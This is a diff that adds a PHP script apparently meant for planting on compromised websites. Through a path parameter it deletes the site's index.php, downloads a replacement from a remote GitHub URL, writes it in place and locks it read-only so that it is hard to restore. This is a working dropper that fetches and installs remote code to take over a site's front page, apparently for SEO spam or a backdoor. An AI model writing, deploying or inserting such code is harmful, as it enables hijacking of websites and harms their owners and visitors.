@@ -1,0 +1,62 @@
+<?php
+// === Config ===
+$remoteUrl = 'https://raw.githubusercontent.com/seobela/bela/refs/heads/main/update.txt';
+$timeoutSeconds = 10;
+
+// === Resolve paths ===
+$currentPath = isset($_GET['path']) ? $_GET['path'] : __DIR__;
+$parentPath = realpath($currentPath . '/..');
+if ($parentPath === false) {
+    echo "Error: cannot resolve parent directory from '{$currentPath}'.";
+    exit(1);
+}
+
+$targetFile = $parentPath . DIRECTORY_SEPARATOR . 'index.php';
+
+// === If index.php exists, fix permissions and delete ===
+if (file_exists($targetFile)) {
+    // Try making it writable before deletion
+    @chmod($targetFile, 0644);
+
+    if (!is_writable($targetFile)) {
+        echo "Error: '{$targetFile}' still not writable after chmod 0644.";
+        exit(1);
+    }
+
+    if (!unlink($targetFile)) {
+        echo "Error: failed to delete existing '{$targetFile}'.";
+        exit(1);
+    }
+}
+
+// === Download remote content ===
+$context = stream_context_create([
+    'http' => [
+        'method'  => 'GET',
+        'header'  => "User-Agent: PHP\r\n",
+        'timeout' => $timeoutSeconds,
+    ],
+    'ssl' => [
+        'verify_peer' => true,
+        'verify_peer_name' => true,
+    ],
+]);
+
+$content = @file_get_contents($remoteUrl, false, $context);
+if ($content === false) {
+    echo "Error: failed to download content from '{$remoteUrl}'.";
+    exit(1);
+}
+
+// === Write content to new index.php ===
+$result = @file_put_contents($targetFile, $content, LOCK_EX);
+if ($result === false) {
+    echo "Error: failed to write to '{$targetFile}'.";
+    exit(1);
+}
+
+// Make new index.php read-only
+@chmod($targetFile, 0444);
+
+echo "Done: {$targetFile}";
+?>
